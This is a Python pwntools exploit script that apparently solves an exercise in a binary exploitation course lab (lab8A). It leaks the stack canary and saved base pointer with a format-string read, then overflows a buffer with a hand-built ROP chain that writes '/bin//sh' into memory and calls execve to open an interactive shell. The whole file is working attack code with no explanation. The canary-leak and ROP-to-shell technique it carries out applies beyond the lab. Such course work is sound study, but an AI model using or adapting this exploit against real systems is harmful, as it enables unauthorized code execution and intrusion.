from pwn import *

p = process(["/levels/lab08/lab8A"])
log.info(util.proc.pidof(p))
pause()

log.info("Leaking canary and saved ebp")
p.recv()
p.sendline("0x%130$08X:0x%131$X")
buf = p.recv(21)
canary, ebp = [int(n, 16) for n in buf.split(":")]
log.info("Got canary 0x{:x}".format(canary))
log.info("Got ebp 0x{:x}".format(ebp))
p.sendline("A")

target_val = 0xdeadbeef ^ canary
log.info("Check is expecting 0x{:x}".format(target_val))
v1 = 0xdeadbeef
RA = 0x080491eb

rop = ""
rop += p32(0x0806f22a) # pop edx ; ret
rop += p32(0x080ec060) # @ .data
rop += p32(0x080bc506) # pop eax ; ret
rop += '/bin'
rop += p32(0x080a2cfd) # mov dword ptr [edx], eax ; ret
rop += p32(0x0806f22a) # pop edx ; ret
rop += p32(0x080ec064) # @ .data + 4
rop += p32(0x080bc506) # pop eax ; ret
rop += '//sh'
rop += p32(0x080a2cfd) # mov dword ptr [edx], eax ; ret
rop += p32(0x0806f22a) # pop edx ; ret
rop += p32(0x080ec068) # @ .data + 8
rop += p32(0x08054ab0) # xor eax, eax ; ret
rop += p32(0x080a2cfd) # mov dword ptr [edx], eax ; ret
rop += p32(0x080481c9) # pop ebx ; ret
rop += p32(0x080ec060) # @ .data
rop += p32(0x080e71c5) # pop ecx ; ret
rop += p32(0x080ec068) # @ .data + 8
rop += p32(0x0806f22a) # pop edx ; ret
rop += p32(0x080ec068) # @ .data + 8
rop += p32(0x08054ab0) # xor eax, eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x0807bc96) # inc eax ; ret
rop += p32(0x08048ef6) # int 0x80

payload = "A"*16+p32(v1)+"____"+p32(canary)+p32(ebp)+rop
#log.info("Sending {}".format(payload))

p.recvuntil("..I like to read ^_^ <==  ")
p.sendline(payload)
p.interactive()
